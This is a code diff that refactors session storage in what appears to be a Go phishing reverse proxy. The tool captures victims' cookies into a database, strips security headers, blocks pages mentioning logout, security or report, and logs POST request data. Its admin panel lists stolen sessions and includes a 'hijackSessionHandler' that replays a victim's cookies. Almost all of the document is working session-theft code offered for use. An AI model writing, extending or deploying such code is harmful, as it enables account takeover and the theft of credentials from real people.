@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"crypto/rand"
 	"crypto/tls"
 	"database/sql"
 	"encoding/json"
@@ -15,7 +16,6 @@ import (
 	"os"
 	"regexp"
 	"strings"
-	"crypto/rand" 
 	"sync"
 	"time"
 
@@ -37,22 +37,12 @@ const (
 )
 
 var (
-	logFile         *os.File
-	logMutex        sync.Mutex
-	db              *sql.DB
-	activeSessions  = make(map[string]Session)
-	sessionMutex    sync.RWMutex
+	logFile        *os.File
+	logMutex       sync.Mutex
+	db             *sql.DB
+	sessionManager *proxy.SessionManager
 	blockedKeywords = []string{"logout", "security", "report"}
 )
-
-type Session struct {
-	ID         string    `json:"id"`
-	Cookies    string    `json:"cookies"`
-	UserAgent  string    `json:"user_agent"`
-	IP         string    `json:"ip"`
-	LastActive time.Time `json:"last_active"`
-	Metadata   string    `json:"metadata"`
-}
 
 func main() {
 	if err := initAll(); err != nil {
@@ -82,6 +72,7 @@ func initAll() error {
 		return fmt.Errorf("static assets initialization failed: %w", err)
 	}
 
+	sessionManager = proxy.NewSessionManager(db, log.Default())
 	go startAdminPanel()
 	go cleanOldSessionsPeriodically()
 	return nil
@@ -334,6 +325,7 @@ func getEnhancedAgentJS() string {
     }
 })();`
 }
+
 func removeSecurityHeaders(req *http.Request) {
 	headers := []string{
 		"Origin",
@@ -356,6 +348,7 @@ func removeSecurityHeadersFromResponse(resp *http.Response) {
 		resp.Header.Del(h)
 	}
 }
+
 /* Session Management */
 
 func getOrCreateSessionID(req *http.Request) string {
@@ -381,49 +374,20 @@ func updateSession(sessionID string, req *http.Request) {
 		return
 	}
 
-	sessionMutex.Lock()
-	defer sessionMutex.Unlock()
-
-	session := activeSessions[sessionID]
-	if session.ID == "" {
-		session = Session{
-			ID:         sessionID,
-			IP:         getClientIP(req),
-			UserAgent:  req.UserAgent(),
-			LastActive: time.Now(),
-		}
+	session := proxy.Session{
+		ID:         sessionID,
+		IP:         proxy.GetClientIP(req),
+		UserAgent:  req.UserAgent(),
+		LastActive: time.Now(),
 	}
 
 	if cookies := req.Header.Get("Cookie"); cookies != "" {
 		session.Cookies = cookies
 	}
 
-	activeSessions[sessionID] = session
-	saveSessionToDB(session)
-}
-
-func getClientIP(req *http.Request) string {
-	if ip := req.Header.Get("X-Forwarded-For"); ip != "" {
-		return strings.Split(ip, ",")[0]
+	if err := sessionManager.Save(context.Background(), session); err != nil {
+		log.Printf("Error saving session: %v", err)
 	}
-	if ip := req.Header.Get("X-Real-IP"); ip != "" {
-		return ip
-	}
-	ip, _, _ := net.SplitHostPort(req.RemoteAddr)
-	return ip
-}
-
-func saveSessionToDB(session Session) error {
-	_, err := db.Exec(`INSERT OR REPLACE INTO sessions 
-		(id, cookies, user_agent, ip, last_active, metadata) 
-		VALUES (?, ?, ?, ?, ?, ?)`,
-		session.ID,
-		session.Cookies,
-		session.UserAgent,
-		session.IP,
-		session.LastActive,
-		session.Metadata)
-	return err
 }
 
 func cleanOldSessionsPeriodically() {
@@ -431,17 +395,10 @@ func cleanOldSessionsPeriodically() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		if err := cleanOldSessions(sessionLifetime); err != nil {
+		if _, err := sessionManager.CleanOld(context.Background(), sessionLifetime); err != nil {
 			log.Printf("Error cleaning old sessions: %v", err)
 		}
 	}
-}
-
-func cleanOldSessions(maxAge time.Duration) error {
-	_, err := db.Exec(`DELETE FROM sessions 
-		WHERE last_active < ?`,
-		time.Now().Add(-maxAge).Format(time.RFC3339))
-	return err
 }
 
 /* Content Manipulation */
@@ -523,7 +480,7 @@ func logRequestData(sessionID string, req *http.Request) {
 		req.Method,
 		req.URL.String(),
 		sessionID,
-		getClientIP(req),
+		proxy.GetClientIP(req),
 		req.UserAgent())
 
 	if req.Method == "POST" {
@@ -557,27 +514,28 @@ func startAdminPanel() {
 }
 
 func listSessionsHandler(w http.ResponseWriter, r *http.Request) {
-	sessionMutex.RLock()
-	defer sessionMutex.RUnlock()
-	json.NewEncoder(w).Encode(activeSessions)
+	sessions, err := sessionManager.GetAll(context.Background())
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	json.NewEncoder(w).Encode(sessions)
 }
 
 func hijackSessionHandler(w http.ResponseWriter, r *http.Request) {
 	sessionID := r.URL.Query().Get("id")
-	sessionMutex.RLock()
-	session, exists := activeSessions[sessionID]
-	sessionMutex.RUnlock()
-
-	if exists {
-		http.SetCookie(w, &http.Cookie{
-			Name:    "session_token",
-			Value:   session.Cookies,
-			Expires: time.Now().Add(1 * time.Hour),
-		})
-		fmt.Fprintf(w, "Session hijacked successfully")
-	} else {
+	session, err := sessionManager.GetByID(context.Background(), sessionID)
+	if err != nil {
 		http.Error(w, "Session not found", http.StatusNotFound)
+		return
 	}
+
+	http.SetCookie(w, &http.Cookie{
+		Name:    "session_token",
+		Value:   session.Cookies,
+		Expires: time.Now().Add(1 * time.Hour),
+	})
+	fmt.Fprintf(w, "Session hijacked successfully")
 }
 
 /* Cleanup */
